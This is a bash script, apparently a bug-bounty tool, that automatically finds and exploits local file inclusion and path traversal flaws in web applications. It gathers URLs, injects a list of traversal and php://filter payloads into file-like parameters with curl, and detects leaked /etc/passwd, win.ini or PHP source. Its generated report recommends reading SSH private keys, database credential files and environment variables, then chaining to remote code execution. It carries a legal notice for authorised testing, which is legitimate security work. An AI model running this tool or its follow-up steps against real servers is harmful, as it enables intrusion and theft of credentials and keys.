#!/usr/bin/env bash
# lfi_finder.sh — Local File Inclusion / Path Traversal candidate finder.
#
# How it works:
#   1) Collect URLs (gau) → keep params that look file-ish
#      (file, path, page, doc, include, view, template, ...)
#   2) For each, fire a battery of traversal payloads
#   3) Look for content markers in the response:
#      - /etc/passwd:  "root:x:" / "/bin/" / "/sbin/nologin"
#      - Windows hosts file: "127.0.0.1       localhost" + "Microsoft"
#      - php://filter base64: starts with "PD9waHA" (== "<?php" base64)
#
# Required: curl, gau (optional)

set -uo pipefail

LEGAL='
================ LEGAL NOTICE ================
LFI probes can read sensitive files on a vulnerable server. Use only on:
  (a) your own systems,
  (b) authorised targets,
  (c) self-hosted lab apps.
==============================================
'

TARGET=""; URLLIST=""; OUT=""; YES=0
while [[ $# -gt 0 ]]; do
  case "$1" in
    -l|--list) URLLIST="$2"; shift 2 ;;
    -o|--out)  OUT="$2"; shift 2 ;;
    --yes)     YES=1; shift ;;
    -h|--help) sed -n '2,16p' "$0"; exit 0 ;;
    *)         TARGET="$1"; shift ;;
  esac
done

[[ -z "$TARGET" && -z "$URLLIST" ]] && { echo "Usage: $0 <target-url> | -l urls.txt"; exit 2; }
echo "$LEGAL"
[[ $YES -ne 1 ]] && { read -rp "Proceed? (yes/N) " a; [[ "$a" != yes ]] && exit 1; }

OUT="${OUT:-./lfi_$(date +%Y%m%d_%H%M%S)}"
mkdir -p "$OUT"
URLS="$OUT/urls.txt"
TARGETED="$OUT/file_params.txt"
HITS="$OUT/hits.txt"
REPORT="$OUT/report.md"

have(){ command -v "$1" >/dev/null 2>&1; }

FILE_PARAMS='file|filename|path|page|doc|document|template|include|view|content|read|load|require|fetch|asset|resource'

# ---- Payloads ---------------------------------------------------------
read -r -d '' PAYLOADS <<'EOF' || true
../../../../../../etc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%2f..%2f..%2fetc%2fpasswd
/etc/passwd
/etc/passwd%00
/etc/passwd?
file:///etc/passwd
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=/etc/passwd
..\..\..\..\windows\win.ini
..%5c..%5c..%5c..%5cwindows%5cwin.ini
%252e%252e%252f%252e%252e%252fetc%252fpasswd
EOF

# ---- 1. Collect URLs --------------------------------------------------
if [[ -n "$URLLIST" ]]; then cp "$URLLIST" "$URLS"
elif have gau; then echo "[*] gau on $TARGET ..."; echo "$TARGET" | gau --threads 5 2>/dev/null | sort -u > "$URLS"
else echo "$TARGET" > "$URLS"; fi
NURL=$(wc -l < "$URLS")

# ---- 2. Filter -------------------------------------------------------
grep -iE "[?&](${FILE_PARAMS})=" "$URLS" | sort -u > "$TARGETED"
NPARAM=$(wc -l < "$TARGETED")
echo "    -> $NURL URLs, $NPARAM file-ish params"

(( NPARAM == 0 )) && { echo "    !! no file-ish params; nothing to probe"; exit 0; }

# ---- 3. Probe --------------------------------------------------------
> "$HITS"
echo "[*] Probing ..."
while read -r u; do
  # Replace the matching param value with each payload
  while IFS= read -r p; do
    [[ -z "$p" ]] && continue
    p_enc=$(printf '%s' "$p" | jq -sRr @uri 2>/dev/null || echo "$p")
    mutated=$(echo "$u" | sed -E "s#([?&](${FILE_PARAMS})=)[^&]*#\1${p_enc}#i")
    body=$(curl -sk --max-time 8 "$mutated" 2>/dev/null)
    if echo "$body" | grep -qE "root:.*:0:0:|nobody:[x*]:|^bin:[x*]:|/bin/(ba)?sh"; then
      echo "LINUX_PASSWD | $mutated" >> "$HITS"
      echo "  [HIT] /etc/passwd: $mutated"
    elif echo "$body" | grep -qE "for 16-bit app support|^\[fonts\]"; then
      echo "WINDOWS_INI | $mutated" >> "$HITS"
      echo "  [HIT] win.ini: $mutated"
    elif echo "$body" | grep -qE "^PD9waHA"; then
      echo "PHP_SOURCE_B64 | $mutated" >> "$HITS"
      echo "  [HIT] php source disclosed: $mutated"
    fi
  done <<< "$PAYLOADS"
done < "$TARGETED"

NHIT=$(wc -l < "$HITS" 2>/dev/null || echo 0)
echo "    -> $NHIT confirmed reads"

# ---- 4. Report -------------------------------------------------------
{
  echo "# LFI / Path Traversal Report"
  echo
  echo "_Generated: $(date -u '+%Y-%m-%dT%H:%M:%SZ')_"
  echo
  echo "## Summary"
  echo
  echo "| Metric | Count |"
  echo "|--------|-------|"
  echo "| URLs scanned | $NURL |"
  echo "| File-ish params probed | $NPARAM |"
  echo "| Confirmed file reads | $NHIT |"
  echo
  echo "## Hits"
  if [[ -s "$HITS" ]]; then
    echo '```'
    cat "$HITS"
    echo '```'
  else
    echo "_(no confirmed reads)_"
    echo
    echo "Things to try manually if nothing fired:"
    echo "- Different file targets (\`/proc/self/environ\`, \`/var/log/apache2/access.log\` for log poisoning chains)"
    echo "- Wrappers: \`expect://\`, \`data://\`, \`zip://\`"
    echo "- Encoding chain: double URL-encode, UTF-8 overlong"
    echo "- Different path depth (try 3, 5, 8, 12 levels of \`../\`)"
  fi
  echo
  echo "## Recommended next steps for hits"
  echo
  echo "1. Read additional files for impact:"
  echo "   - \`/etc/passwd\` → user list"
  echo "   - \`~/.ssh/id_rsa\` → SSH key (HIGH IMPACT)"
  echo "   - \`/var/www/html/config.php\` → DB creds (HIGH IMPACT)"
  echo "   - \`/proc/self/environ\` → env vars (often contain secrets)"
  echo "2. Chain to RCE if possible (log poisoning, log4j, PHP wrapper RCE)."
  echo "3. Document one minimal PoC; don't dump everything."
  echo
  echo "---"
  echo
  echo "_File reads ≠ exploitable LFI in every program's eyes. Some programs explicitly require demonstrated RCE for full payout._"
} > "$REPORT"

echo
echo "[+] Done."
echo "    Report: $REPORT"
